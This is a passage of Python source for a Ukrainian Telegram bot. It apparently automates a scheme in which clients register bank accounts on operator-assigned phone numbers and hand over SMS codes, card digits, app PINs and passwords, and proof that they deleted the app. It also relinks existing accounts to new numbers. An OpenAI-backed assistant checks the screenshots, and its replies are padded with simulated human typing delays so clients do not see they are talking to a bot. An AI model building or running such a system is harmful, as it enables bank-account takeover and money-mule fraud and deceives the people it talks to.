            if int(existing_session.get('waiting_proceedings') or 0) == 1:
                text_lower = message.text.strip().lower()
                is_yes = any(word in text_lower for word in ["так", "да", "yes", "є", "угу", "+"])
                is_no = any(word in text_lower for word in ["ні", "нет", "no", "нема", "немає", "-"])
                
                if is_no:
                    from bot.handlers.verifier import process_rejection
                    await process_rejection(existing_session, bot, ban=False)
                    await state.clear()
                elif is_yes:
                    await message.answer("Надішліть будь ласка скріншот з Дія, де видно що закрито")
                else:
                    await message.answer("Надішліть будь ласка скріншот з Дія, де видно що закрито")
                return
            else:
                await message.answer("Ваша анкета знаходиться на перевірці у верифікатора. Будь ласка, зачекайте.")
                return
        elif existing_session['status'] not in ('number_assigned', 'waiting_code'):
            await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
            return
        
        # Якщо це коротке повідомлення-підтвердження/пауза, просто ігноруємо
        if message.text and is_acknowledgment_text(message.text):
            logger.info(f"Ігноруємо повідомлення-підтвердження від клієнта {client_id}: {message.text}")
            return

        # Показати статус "typing", щоб користувач знав, що бот обробляє запит
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        sent_codes_count = existing_session.get('sent_codes_count', 0)
        
        # Перевіряємо зміну банку для очищення історії
        state_data = await state.get_data()
        last_bank = state_data.get("last_bank")
        chat_history = state_data.get("chat_history", [])
        if last_bank != current_bank_name:
            chat_history = []
            await state.update_data(last_bank=current_bank_name, chat_history=[])

        # 1. Перевіряємо, чи повідомлення свідчить про невірний код / код не підійшов
        if is_wrong_code_text(message.text or "", chat_history):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Так, потрібен новий код", callback_data="wrongcode_yes")],
                [InlineKeyboardButton(text="Ні, все гаразд", callback_data="wrongcode_no")]
            ])
            await message.answer("Не підійшов код?", reply_markup=keyboard)
            await state.set_state(RegistrationStates.waiting_wrong_code_confirm)
            return

        # 2. Перевіряємо, чи повідомлення схоже на запит SMS-коду
        if is_code_request_text(message.text or ""):
            async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
                await message.answer(msg)
            await state.update_data(support_requests_count=0)
            await trigger_sms_code_request(client_id, bot, state, notify)
            return

        # Перевірка: якщо клієнт пише, що зареєстрував, але жодного коду ще не надіслано
        if is_claim_registration_text(message.text or "") and sent_codes_count == 0:
            await message.answer(
                "Ви не могли зробити реєстрацію по нашому номеру якщо ви не надіслали жодного коду, ви зробили реєстрацію за своїм номером?"
            )
            await state.set_state(RegistrationStates.waiting_own_number_confirm)
            return

        state_data = await state.get_data()
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 20:
            await message.answer(
                "Ви перевищили ліміт запитань до ШІ. Зараз підключиться менеджер і відповість на всі ваші запитання. "
                "Будь ласка, очікуйте."
            )
            return

        from bot.services.ai_task_manager import register_ai_task, unregister_ai_task, is_session_ai_paused
        current_task = asyncio.current_task()
        if current_task:
            register_ai_task(client_id, current_task)

        try:
            from bot.openai_client import get_support_response
            response = await get_support_response(
                user_text=message.text,
                client_data=client_data,
                current_bank_name=current_bank_name,
                chat_history=chat_history,
                sent_codes_count=sent_codes_count
            )
            
            if await is_session_ai_paused(client_id):
                logger.info(f"🛑 AI response cancelled for client {client_id} (paused in DB)")
                return

            # Імітація людського друку перед надсиланням відповіді
            import random
            char_count = len(response)
            delay = min(7.0, max(3.0, char_count / 15.0)) + random.uniform(-0.5, 1.0)
            delay = max(3.0, min(8.0, delay))
            await simulate_typing(bot, client_id, delay)
            
            if await is_session_ai_paused(client_id):
                logger.info(f"🛑 AI response cancelled for client {client_id} before sending answer")
                return

            if "[SUCCESS_VERIFICATION]" in response:
                bank_label = current_bank_name if current_bank_name else "банк"
                await state.update_data(support_requests_count=0)
                
                success_text = None
                if current_bank_name:
                    template = await db.get_bank_template_db(current_bank_name)
                    if template and template.get('success_text'):
                        success_text = template['success_text']
                
                prompt_msg = success_text or f"Чудово! Будь ласка, надішліть скріншот, який підтверджує успішну реєстрацію в {bank_label}."
                await message.answer(
                    prompt_msg,
                    reply_markup=ReplyKeyboardRemove()
                )
                return

            # Додаємо повідомлення в історію, якщо це не успішна верифікація
            user_msg = {"role": "user", "content": message.text}
            
            raw_response = response
            if "\n\nЯ всього автоматизатор" in response:
                raw_response = response.split("\n\nЯ всього автоматизатор")[0].strip()
            assistant_msg = {"role": "assistant", "content": raw_response}
            
            chat_history.append(user_msg)
            chat_history.append(assistant_msg)
            chat_history = chat_history[-10:] # Зберігаємо останні 10 повідомлень
            await state.update_data(chat_history=chat_history)

            if "[OFFER_AMOBANK_INSTRUCTIONS]" in response:
                await state.set_state(RegistrationStates.waiting_amobank_instruction_confirm)
            if "[OFFER_LVIV_SUCCESS_SCREEN]" in response:
                await state.set_state(RegistrationStates.waiting_lviv_success_confirm)

            raw_parts = re.split(r'\[SPLIT\]?', response, flags=re.IGNORECASE)
            clean_parts = []
            for part in raw_parts:
                clean_part = re.sub(r'\[[^\]]*\]?', '', part).strip()
                if clean_part:
                    clean_parts.append(clean_part)

            for i, part in enumerate(clean_parts):
                if await is_session_ai_paused(client_id):
                    logger.info(f"🛑 AI response cancelled for client {client_id} during part sending")
                    return
                try:
                    await bot.send_chat_action(chat_id=client_id, action="typing")
                except Exception:
                    pass
                import random
                char_count = len(part)
                delay = min(4.0, max(1.5, char_count / 15.0)) + random.uniform(-0.3, 0.5)
                await asyncio.sleep(delay)
                
                if await is_session_ai_paused(client_id):
                    logger.info(f"🛑 AI response cancelled for client {client_id} during part sending sleep")
                    return

                is_last = (i == len(clean_parts) - 1)
                reply_markup = ReplyKeyboardRemove() if is_last else None
                await message.answer(part, reply_markup=reply_markup)
        except asyncio.CancelledError:
            logger.info(f"🛑 AI Task cancelled via CancelledError for client {client_id}")
            return
        finally:
            unregister_ai_task(client_id, current_task)

        if "[OFFER_LVIV_SUCCESS_SCREEN]" in response:
            import os
            from aiogram.types import FSInputFile
            img_path = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "lvivbank_success.png")
            if os.path.exists(img_path):
                try:
                    msg = await bot.send_photo(chat_id=client_id, photo=FSInputFile(img_path))
                    file_id = msg.photo[-1].file_id
                    await state.update_data(lviv_template_photo_id=file_id)
                except Exception as e:
                    logger.error(f"Error sending lviv success template photo: {e}")

        # Якщо в відповіді ШІ згадується мультивалютна карта для bank.kd, додатково надсилаємо фото-інструкцію (лише один раз за сесію)
        is_bank_kd = current_bank_name and "bank.kd" in current_bank_name.lower()
        if is_bank_kd and any(word in response.lower() for word in ["мультивалютн"]):
            state_data = await state.get_data()
            if not state_data.get("bank_kd_cards_photo_sent"):
                import os
                from aiogram.types import FSInputFile
                cards_photo_path = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "bank.kd_cards_instruction.png")
                if os.path.exists(cards_photo_path):
                    try:
                        await bot.send_photo(
                            chat_id=client_id,
                            photo=FSInputFile(cards_photo_path)
                        )
                        await state.update_data(bank_kd_cards_photo_sent=True)
                    except Exception as e:
                        logger.error(f"Error sending bank.kd card choice instruction photo in text: {e}")
        return

    # Якщо користувач не у стані анкетування, пропонуємо йому почати з команди /start
    await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
@router.message(StateFilter(None), F.chat.type == "private", F.photo)
async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
    """Обробник скріншоту від користувача (ШІ розпізнавання помилок)"""
    client_id = message.from_user.id
    
    # Якщо це частина альбому (media_group_id) і відповідь уже надсилалася — ігноруємо дубль
    if message.media_group_id and not should_send_client_reply(client_id, key=f"mg_{message.media_group_id}", cooldown=5.0):
        logger.info(f"Skipping duplicate media_group response for client {client_id}, mg: {message.media_group_id}")
        return

    # Перевіряємо, чи є вже активна сесія
    existing_session = await db.get_session(client_id)
    if existing_session:
        if existing_session.get('is_paused'):
            logger.info(f"AI bot is paused for client {client_id}. Ignoring automatic AI photo support response.")
            return
        if existing_session['status'] == 'registered':
            if should_send_client_reply(client_id, key="registered_wait", cooldown=3.0):
                await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")
            return
        elif existing_session['status'] == 'waiting_verification':
            if int(existing_session.get('waiting_proceedings') or 0) == 1:
                # Дозволяємо надсилання скріншоту
                pass
            else:
                if should_send_client_reply(client_id, key="verif_wait", cooldown=3.0):
                    await message.answer("Ваша анкета знаходиться на перевірці у верифікатора. Будь ласка, зачекайте.")
                return
        elif existing_session['status'] not in ('number_assigned', 'waiting_code'):
            if should_send_client_reply(client_id, key="start_prompt", cooldown=3.0):
                await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
            return
        
        # Беремо фото найкращої якості
        photo = message.photo[-1]
        
        if existing_session['status'] == 'waiting_verification' and int(existing_session.get('waiting_proceedings') or 0) == 1:
            await handle_proceedings_screenshot(message, photo, existing_session, bot, state)
            return
        
        # Зберігаємо останнє фото в стані для можливості відновлення анкетування текстом
        await state.update_data(last_photo_id=photo.file_id)
        
        # 1. Перевіряємо, чи підпис до фото свідчить про невірний код / код не підійшов
        state_data = await state.get_data()
        chat_history = state_data.get("chat_history", [])
        if message.caption and is_wrong_code_text(message.caption, chat_history):
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Так, потрібен новий код", callback_data="wrongcode_yes")],
                [InlineKeyboardButton(text="Ні, все гаразд", callback_data="wrongcode_no")]
            ])
            await message.answer("Не підійшов код?", reply_markup=keyboard)
            await state.set_state(RegistrationStates.waiting_wrong_code_confirm)
            return

        # 2. Перевіряємо, чи підпис до фото схожий на запит SMS-коду
        if message.caption and is_code_request_text(message.caption):
            async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
                await message.answer(msg)
            await state.update_data(support_requests_count=0)
            await trigger_sms_code_request(client_id, bot, state, notify)
            return
            
        state_data = await state.get_data()
        support_count = state_data.get('support_requests_count', 0) + 1
        await state.update_data(support_requests_count=support_count)
        
        if support_count > 20:
            await message.answer(
                "Ви перевищили ліміт запитань до ШІ. Зараз підключиться менеджер і відповість на всі ваші запитання. "
                "Будь ласка, очікуйте."
            )
            return
            
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        sent_codes_count = existing_session.get('sent_codes_count', 0)
        
        import io
        photo_file = await bot.get_file(photo.file_id)
        photo_bytes = io.BytesIO()
        await bot.download_file(photo_file.file_path, photo_bytes)
        photo_data = photo_bytes.getvalue()
        

        
        from bot.services.ai_task_manager import register_ai_task, unregister_ai_task, is_session_ai_paused
        current_task = asyncio.current_task()
        if current_task:
            register_ai_task(client_id, current_task)

        try:
            from bot.openai_client import get_support_response
            response = await get_support_response(
                user_text=message.caption,
                image_bytes=photo_data,
                client_data=client_data,
                current_bank_name=current_bank_name,
                sent_codes_count=sent_codes_count
            )
            
            if await is_session_ai_paused(client_id):
                logger.info(f"🛑 AI photo response cancelled for client {client_id} (paused in DB)")
                return

            # Імітація людського друку перед надсиланням відповіді
            import random
            char_count = len(response)
            delay = min(7.0, max(3.0, char_count / 15.0)) + random.uniform(-0.5, 1.0)
            delay = max(3.0, min(8.0, delay))
            await simulate_typing(bot, client_id, delay)

            if await is_session_ai_paused(client_id):
                logger.info(f"🛑 AI photo response cancelled for client {client_id} before sending answer")
                return
        except asyncio.CancelledError:
            logger.info(f"🛑 AI photo Task cancelled via CancelledError for client {client_id}")
            return
        finally:
            unregister_ai_task(client_id, current_task)
        
        is_bank_kd = current_bank_name and "bank.kd" in current_bank_name.lower()
        is_lvivbank = current_bank_name and "lviv" in current_bank_name.lower()
        bank_label = current_bank_name if current_bank_name else "банк"

        # Визначаємо, чи успішно розпізнано скріншот
        is_success = False
        if is_bank_kd:
            is_success = "[KD_CARD_SCREEN]" in response or "[KD_MAIN_SCREEN]" in response or "[SUCCESS_VERIFICATION]" in response
        else:
            is_success = "[SUCCESS_VERIFICATION]" in response

        if is_success:
            await state.update_data(support_requests_count=0)
            card_first4, card_last4 = None, None
            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
            if card_match:
                card_first4 = card_match.group(1)
                card_last4 = card_match.group(2)
                await state.update_data(card_first4=card_first4, card_last4=card_last4)
            
            # --- Робота з кількома скріншотами ---
            # Якщо банк змінився, скидаємо список
            last_verified_bank = state_data.get("last_verified_bank")
            uploaded_screenshots = state_data.get("uploaded_screenshots") or []
            if last_verified_bank != current_bank_name:
                uploaded_screenshots = []
                await state.update_data(uploaded_screenshots=[], last_verified_bank=current_bank_name)

            # Отримуємо ліміт скріншотів для поточного банку
            key, template = await db.get_bank_template_with_key_db(current_bank_name)
            required_count = 1
            if template and template.get('required_screenshots'):
                try:
                    required_count = int(template['required_screenshots'])
                except Exception:
                    pass

            if photo.file_id not in [s['file_id'] for s in uploaded_screenshots]:
                uploaded_screenshots.append({
                    'file_id': photo.file_id,
                    'card_first4': card_first4,
                    'card_last4': card_last4
                })
                await state.update_data(uploaded_screenshots=uploaded_screenshots)

            if len(uploaded_screenshots) < required_count:
                remaining = required_count - len(uploaded_screenshots)
                # Повідомляємо клієнта про необхідність надіслати наступний скріншот
                await message.answer(f"Дякую! Скріншот прийнято. Будь ласка, надішліть наступний скріншот (залишилось завантажити: {remaining}).")
                return

            # Об'єднуємо всі file_id через кому, щоб зберегти історію в БД
            success_photos_str = ",".join([s['file_id'] for s in uploaded_screenshots])
            
            await state.update_data(success_photo_id=photo.file_id)
            await db.update_session_verification_data(
                client_id, 
                success_photo_id=success_photos_str, 
                card_first4=card_first4, 
                card_last4=card_last4
            )

            if is_lvivbank:
                if existing_session and existing_session.get('client_phone'):
                    # Якщо є збережений телефон для lvivbank, відразу продовжуємо
                    await continue_after_phone(message, state, bot, client_id)
                else:
                    success_text = (
                        "Дякую! Усі скріншоти прийнято.\n\n"
                        "Будь ласка, напишіть Ваш номер телефону?"
                    )
                    await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                    await state.set_state(RegistrationStates.waiting_phone)
            else:
                state_data = await state.get_data()
                if state_data.get('is_relink'):
                    success_text = (
                        "Дякую! Усі скріншоти прийнято.\n\n"
                        "Який пін-код стояв на застосунку?"
                    )
                else:
                    success_text = (
                        "Дякую! Усі скріншоти прийнято.\n\n"
                        "Який пін-код чи пароль ставали на додаток?"
                    )
                await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
                await state.set_state(RegistrationStates.waiting_password)
            return
        else:
            if "[OFFER_AMOBANK_INSTRUCTIONS]" in response:
                await state.set_state(RegistrationStates.waiting_amobank_instruction_confirm)
            if "[OFFER_LVIV_SUCCESS_SCREEN]" in response:
                await state.set_state(RegistrationStates.waiting_lviv_success_confirm)

            raw_parts = re.split(r'\[SPLIT\]?', response, flags=re.IGNORECASE)
            clean_parts = []
            for part in raw_parts:
                clean_part = re.sub(r'\[[^\]]*\]?', '', part).strip()
                if clean_part:
                    clean_parts.append(clean_part)

            for part in clean_parts:
                try:
                    await bot.send_chat_action(chat_id=client_id, action="typing")
                except Exception:
                    pass
                import random
                char_count = len(part)
                delay = min(4.0, max(1.5, char_count / 15.0)) + random.uniform(-0.3, 0.5)
                await asyncio.sleep(delay)
                
                await message.answer(part)

            if "[OFFER_LVIV_SUCCESS_SCREEN]" in response:
                import os
                from aiogram.types import FSInputFile
                img_path = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "lvivbank_success.png")
                if os.path.exists(img_path):
                    try:
                        msg = await bot.send_photo(chat_id=client_id, photo=FSInputFile(img_path))
                        file_id = msg.photo[-1].file_id
                        await state.update_data(lviv_template_photo_id=file_id)
                    except Exception as e:
                        logger.error(f"Error sending lviv success template photo: {e}")

            # Якщо в відповіді ШІ згадується мультивалютна карта для bank.kd, додатково надсилаємо фото-інструкцію
            if is_bank_kd and any(word in response.lower() for word in ["мультивалютн"]):
                import os
                from aiogram.types import FSInputFile
                cards_photo_path = os.path.join(os.path.dirname(__file__), "..", "resources", "images", "bank.kd_cards_instruction.png")
                if os.path.exists(cards_photo_path):
                    try:
                        await bot.send_photo(
                            chat_id=client_id,
                            photo=FSInputFile(cards_photo_path)
                        )
                    except Exception as e:
                        logger.error(f"Error sending bank.kd card choice instruction photo in photo: {e}")
            return
        
    await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")
@router.callback_query(F.data == "wrongcode_yes")
async def handle_wrongcode_yes(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    
    await callback.message.answer(
        "Запросіть новий SMS-код у додатку банку. Як тільки зробите це — напишіть мені «новий код» або «потрібен код».",
        parse_mode="Markdown"
    )
    await callback.answer()
@router.callback_query(F.data == "wrongcode_no")
async def handle_wrongcode_no(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Добре! Продовжуйте реєстрацію.")
    await callback.answer()
@router.message(RegistrationStates.waiting_wrong_code_confirm, F.chat.type == "private")
async def process_wrong_code_confirm_text(message: Message, state: FSMContext):
    t = message.text.lower().strip()
    yes_words = ["так", "yes", "да", "дп", "ага", "угу", "треба", "потрібен", "новий", "давай", "так потрібен"]
    no_words = ["ні", "no", "нет", "все добре", "все нормально", "все ок", "ок", "не треба", "ні все добре"]
    
    is_yes = False
    is_no = False
    
    for w in yes_words:
        if w in t:
            is_yes = True
            break
            
    for w in no_words:
        if w in t:
            is_no = True
            break
            
    if is_yes:
        await state.clear()
        await message.answer(
            "Запросіть новий SMS-код у додатку банку. Як тільки зробите це — напишіть мені «новий код» або «потрібен код».",
            parse_mode="Markdown"
        )
    elif is_no:
        await state.clear()
        await message.answer("Добре! Продовжуйте реєстрацію.")
    else:
        await message.answer(
            "Будь ласка, оберіть відповідь на кнопках нижче або напишіть 'так' чи 'ні':"
        )
@router.message(RegistrationStates.waiting_own_number_confirm, F.chat.type == "private")
async def process_own_number_confirm(message: Message, state: FSMContext, bot: Bot):
    t = (message.text or "").lower().strip()
    affirmative_words = [
        "так", "ага", "угу", "да", "дп", "конечно", "звісно", "саме так", 
        "своїм", "на свій", "на свой", "свой", "свій", "да, на свой", "так, на свій"
    ]
    is_affirmative = False
    for word in affirmative_words:
        if word in t:
            is_affirmative = True
            break
            
    if is_affirmative:
        await mark_bank_as_failed(message.from_user.id, bot)
        await state.clear()
    else:
        await message.answer("Добре. Тоді, будь ласка, спробуйте ще раз ввести в додатку номер, який я вам надіслав. Коли додаток попросить код підтвердження — напишіть про це сюди.")
        await state.clear()
@router.message(RegistrationStates.waiting_amobank_instruction_confirm, F.chat.type == "private")
async def process_amobank_instruction_confirm(message: Message, state: FSMContext, bot: Bot):
    t = (message.text or "").lower().strip()
    affirmative_words = ["так", "давай", "надсилай", "кидай", "ок", "окей", "да", "скинь", "скидуй", "звісно", "ага", "угу", "хочу"]
    
    is_yes = any(word in t for word in affirmative_words)
    
    if is_yes:
        await state.clear()
        await message.answer("Ось детальний шаблон заповнення анкети для AmoBank:")
        
        from aiogram.types import InputMediaPhoto, FSInputFile
        import os
        
        images_dir = os.path.join(os.path.dirname(__file__), "..", "resources", "images")
        media = []
        for i in range(1, 5):
            img_path = os.path.join(images_dir, f"amobank_step{i}.png")
            if os.path.exists(img_path):
                media.append(InputMediaPhoto(media=FSInputFile(img_path)))
        
        if media:
            try:
                sent_messages = await bot.send_media_group(chat_id=message.chat.id, media=media)
                for idx, msg in enumerate(sent_messages):
                    if msg.photo:
                        caption = msg.caption if msg.caption else None
                        await db.log_chat_message(
                            message.from_user.id, 'bot', caption if idx == 0 else None,
                            msg.photo[-1].file_id, msg.message_id
                        )
            except Exception as e:
                logger.error(f"Error sending amobank screenshots: {e}")
                await message.answer("Не вдалося надіслати зображення через технічну помилку.")
        else:
            await message.answer("Зображення шаблону не знайдено.")
    else:
        # Clear state and process the message normally via handle_client_data_manual
        await state.clear()
        await handle_client_data_manual(message, state, bot)
@router.message(RegistrationStates.waiting_lviv_success_confirm, F.chat.type == "private")
async def process_lviv_success_confirm(message: Message, state: FSMContext, bot: Bot):
    t = (message.text or "").lower().strip()
    affirmative_words = ["так", "давай", "ок", "окей", "да", "звісно", "ага", "угу", "хочу"]
    is_yes = any(word in t for word in affirmative_words)
    
    if is_yes:
        # Retrieve template photo file_id we saved earlier
        data = await state.get_data()
        success_photo_id = data.get("lviv_template_photo_id")
        
        # Save it into FSM data under success_photo_id so continue_after_phone can access it
        await state.update_data(success_photo_id=success_photo_id)
        
        # Update in database as well
        await db.update_session_verification_data(
            message.from_user.id,
            success_photo_id=success_photo_id
        )
        
        session = await db.get_session(message.from_user.id)
        if session and session.get('client_phone'):
            # Якщо є збережений телефон, відразу продовжуємо
            await continue_after_phone(message, state, bot, message.from_user.id)
        else:
            await message.answer(
                "Будь ласка, напишіть Ваш номер телефону?",
                reply_markup=ReplyKeyboardRemove()
            )
            await state.set_state(RegistrationStates.waiting_phone)
    else:
        await state.clear()
        await handle_client_data_manual(message, state, bot)

@router.message(RegistrationStates.waiting_deletion_proof, F.chat.type == "private")
async def process_deletion_proof(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data()
    raw_bank = data.get('bank_name')
    template_data = await db.get_bank_template_db(raw_bank) if raw_bank else None
    
    # Визначаємо гарне відображення назви банку
    bank_name = (template_data.get('display_name') if template_data and template_data.get('display_name') else raw_bank) or "банку"
    deletion_req = template_data.get('deletion_requirement', 'none') if template_data else 'none'
    proof_label = "скріншот" if deletion_req == 'screenshot' else "відео"
    
    media_id = None
    media_type = None
    
    if message.photo:
        media_id = message.photo[-1].file_id
        media_type = 'photo'
    elif message.video:
        media_id = message.video.file_id
        media_type = 'video'
    elif message.document:
        mime = message.document.mime_type or ""
        if mime.startswith('image/'):
            media_id = message.document.file_id
            media_type = 'photo'
        elif mime.startswith('video/'):
            media_id = message.document.file_id
            media_type = 'video'
            
    if not media_id:
        await message.answer(f"Будь ласка, надішліть саме {proof_label} видалення додатку {bank_name} для підтвердження.")
        return

    # Надсилаємо статус перевірки
    status_msg = await message.answer("Хвилинку")
    
    try:
        # Завантажуємо медіа
        from io import BytesIO
        file_info = await bot.get_file(media_id)
        file_buffer = BytesIO()
        await bot.download_file(file_info.file_path, file_buffer)
        media_bytes = file_buffer.getvalue()
        
        # Викликаємо ШІ-верифікацію із передачею конкретної назви банку
        from bot.openai_client import verify_deletion_proof as ai_verify
        is_valid, reason = await ai_verify(media_bytes, media_type, bank_name=bank_name)
        
        # Видаляємо статус-повідомлення
        try:
            await status_msg.delete()
        except Exception:
            pass
            
        if is_valid:
            await state.update_data(deletion_proof_media=media_id, deletion_proof_type=media_type)
            await continue_after_phone(message, state, bot, message.from_user.id)
        else:
            fail_text = f"{proof_label.capitalize()} не прийнято."
            if reason:
                fail_text += f" {reason}"
            fail_text += f" Надішліть інший {proof_label}, будь ласка."
            await message.answer(fail_text)
            
    except Exception as e:
        logger.error(f"Помилка при авто-перевірці доказу: {e}")
        try:
            await status_msg.delete()
        except Exception:
            pass
        # У разі критичної помилки дозволяємо пройти далі, щоб не блокувати користувача
        await message.answer("Виникла технічна затримка під час авто-перевірки, але ваш файл збережено для ручної перевірки оператором. Продовжуємо...")
        await state.update_data(deletion_proof_media=media_id, deletion_proof_type=media_type)
        await continue_after_phone(message, state, bot, message.from_user.id)

@router.callback_query(F.data.startswith("relink_choice_"))
async def handle_relink_choice(callback: CallbackQuery, state: FSMContext, bot: Bot):
    parts = callback.data.split("_")
    choice = parts[2]  # "relink" or "fresh"
    line_id = int(parts[3])
    bank_key = "_".join(parts[4:])

    client_id = callback.from_user.id
    is_relink = choice == "relink"

    # Оновлюємо session: is_relink + статус
    async with aiosqlite.connect(db.DB_FILE) as conn:
        await conn.execute(
            "UPDATE sessions SET is_relink = ?, status = 'number_assigned' WHERE client_id = ?",
            (1 if is_relink else 0, client_id)
        )
        await conn.commit()

    await state.update_data(is_relink=is_relink, bank_name=bank_key, assign_line_id=line_id)

    # Видаляємо повідомлення з вибором
    try:
        await callback.message.delete()
    except Exception:
        try:
            await callback.message.edit_reply_markup(reply_markup=None)
        except Exception:
            pass

    from bot.services.line_assignment import send_assigned_phone_to_client
    try:
        await send_assigned_phone_to_client(client_id, line_id, bot, is_relink=is_relink)
    except Exception as e:
        logger.error(f"Помилка надсилання номера після вибору relink/fresh: {e}")
        # Відкочуємо призначення
        await db.set_line_status(line_id, 'available')
        async with aiosqlite.connect(db.DB_FILE) as conn:
            await conn.execute(
                "UPDATE sessions SET line_id = NULL, status = 'registered' WHERE client_id = ?",
                (client_id,)
            )
            await conn.commit()
        await callback.answer("Помилка при відправці. Спробуйте ще раз.", show_alert=True)
        return

    await state.set_state(RegistrationStates.waiting_code)
    await callback.answer("Обрано Перев'яз" if is_relink else "Обрано Нову реєстрацію")

@router.message(RegistrationStates.waiting_relink_initial_screenshot, F.chat.type == "private")
async def process_relink_initial_screenshot(message: Message, state: FSMContext, bot: Bot):
    media_id = None
    media_type = None
    
    if message.photo:
        media_id = message.photo[-1].file_id
        media_type = 'photo'
    elif message.document:
        mime = message.document.mime_type or ""
        if mime.startswith('image/'):
            media_id = message.document.file_id
            media_type = 'photo'

    if not media_id:
        await message.answer("Будь ласка, надішліть саме скріншот додатку для перевірки.")
        return

    data = await state.get_data()
    bank_key = data.get('bank_name') or "bank"
    line_id = data.get('assign_line_id')
    template_data = await db.get_bank_template_db(bank_key)
    bank_name = (template_data.get('display_name') if template_data and template_data.get('display_name') else bank_key) or bank_key

    status_msg = await message.answer("Хвилинку")

    try:
        from io import BytesIO
        file_info = await bot.get_file(media_id)
        file_buffer = BytesIO()
        await bot.download_file(file_info.file_path, file_buffer)
        media_bytes = file_buffer.getvalue()

        from bot.openai_client import verify_relink_initial_screenshot as ai_verify_relink
        is_valid, reason = await ai_verify_relink(media_bytes, bank_name=bank_name)

        try:
            await status_msg.delete()
        except Exception:
            pass

        if is_valid:
            client_id = message.from_user.id
            
            await state.update_data(initial_relink_photo_id=media_id, is_relink=True)
            await db.set_session_status(client_id, 'number_assigned')
            
            # Повідомляємо клієнту про успішну перевірку та надсилаємо призначений номер
            await message.answer("Акаунт перевірено, все ок! 👍")
            
            from bot.services.line_assignment import send_assigned_phone_to_client
            await send_assigned_phone_to_client(client_id, line_id, bot, is_relink=True)
            await state.set_state(RegistrationStates.waiting_code)
            
            # Сповіщаємо адміна / гівера про Перев'яз
            from bot.config import get_admin_id
            username = message.from_user.username or "Немає юзернейму"
            admin_msg = (
                f"🔄 <b>[ПЕРЕВ'ЯЗ] Початок зміни номера!</b>\n"
                f"• Клієнт: @{username} (ID: {client_id})\n"
                f"• Банк: {bank_name}\n"
                f"• Стан акаунту: ✅ Активний (перевірено ШІ)\n"
                f"• Лінія: Line {line_id}"
            )
            await bot.send_message(chat_id=get_admin_id(), text=admin_msg, parse_mode="HTML")
        else:
            await message.answer(
                f"Скріншот не прийнято. {reason}\nНадішліть інший скріншот додатку {bank_name}, будь ласка."
            )
    except Exception as e:
        logger.error(f"Помилка при авто-перевірці первинного скріншота перев'язу: {e}")
        try:
            await status_msg.delete()
        except Exception:
            pass
        await message.answer("Виникла технічна затримка під час авто-перевірки. Надішліть скріншот ще раз.")


async def _continue_pumb_start(client_id: int, username_db: str, client_bot_username: str, pumb_type: str, client_message: Message, bot: Bot):
    """Продовження обробки PUMB-профілю після вибору типу реєстрації."""
    profile = await get_bank_profile_by_bot_username(client_bot_username)
    pumb_banks = []
    if profile and profile.get('selected_banks'):
        pumb_banks = [b for b in profile['selected_banks'] if b]
    if not pumb_banks:
        pumb_banks = ['PUMB']

    selected_str = ','.join(pumb_banks)
    # Створюємо сесію зі статусом заповнення анкети, як і для інших ботів
    await db.create_registering_session(client_id, username_db, bot_username=client_bot_username)
    await db.set_session_is_relink(client_id, 1 if pumb_type == "rebind" else 0)
    await db.update_session_banks(client_id, selected_str, selected_str)

    all_banks = await get_all_banks_for_selection()
    history = await db.get_client_verification_history(client_id)
    passed_banks = {h['bank'] for h in history if h['status'] == 'success'}
    banned_banks = {h['bank'] for h in history if h['status'] in ('banned', 'failure')}
    keyboard_buttons = build_bank_selection_rows(
        all_banks, client_id, selected=pumb_banks, passed_banks=passed_banks, banned_banks=banned_banks
    )
    keyboard_buttons.append([InlineKeyboardButton(text="Зберегти та продовжити", callback_data=f"savebanks_{client_id}")])
    keyboard_buttons.append([InlineKeyboardButton(text="Відхилити запит", callback_data=f"reject_{client_id}")])
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)

    escaped_username = html.escape(username_db) if username_db else "Невідомий"
    type_label = "Нова Реєстрація" if pumb_type == "new" else "Перев'яз"
    admin_msg = (
        f"Новий клієнт на верифікацію (ПУМБ)!\n"
        f"• Telegram: @{escaped_username} (ID: {client_id})\n"
        f"• Банк: PUMB\n"
        f"• Тип: {type_label}\n\n"
        f"Оберіть банки, які має пройти клієнт:"
    )
    admin_bot = get_bot() or bot
    try:
        await admin_bot.send_message(chat_id=get_admin_id(), text=admin_msg, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Помилка надсилання адмін-повідомлення: {e}")


@router.callback_query(F.data == "pumb_new")
@router.callback_query(F.data == "pumb_rebind")
async def handle_pumb_choice(callback: CallbackQuery, state: FSMContext):
    """Обробник вибору типу реєстрації для ПУМБ."""
    pumb_type = "new" if callback.data == "pumb_new" else "rebind"

